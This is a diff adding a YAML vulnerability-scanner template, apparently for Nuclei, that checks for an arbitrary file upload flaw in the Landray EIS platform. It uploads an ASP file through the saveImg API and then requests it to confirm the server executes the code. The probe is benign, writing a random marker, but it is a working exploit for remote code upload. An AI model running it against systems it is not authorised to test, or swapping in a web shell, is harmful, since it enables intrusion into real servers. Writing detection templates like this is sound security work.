@@ -1,0 +1,61 @@
+id: landray-eis-api-file-upload
+info:
+  name: Landray EIS Intelligent Collaboration Platform Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_text_alphanumeric(4)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/eis/service/api.aspx?action=saveImg'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynUqjgvhmkL1dxpCV
+    body: |-
+      ------WebKitFormBoundarynUqjgvhmkL1dxpCV
+      Content-Disposition: form-data; name="file"; filename="test.asp"
+      Content-Type: text/html
+
+      <% response.write("{{t1}}")%>
+      ------WebKitFormBoundarynUqjgvhmkL1dxpCV--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "asp"
+        part: body
+      - type: word
+        words:
+          - "files"
+        part: body
+    extractors:
+      - type: regex
+        name: t2
+        internal: true
+        group: 1
+        regex:
+          - "[0-9]{20}"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/files/editor_img/{{t2}}/{{t2}}.asp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
+        part: body
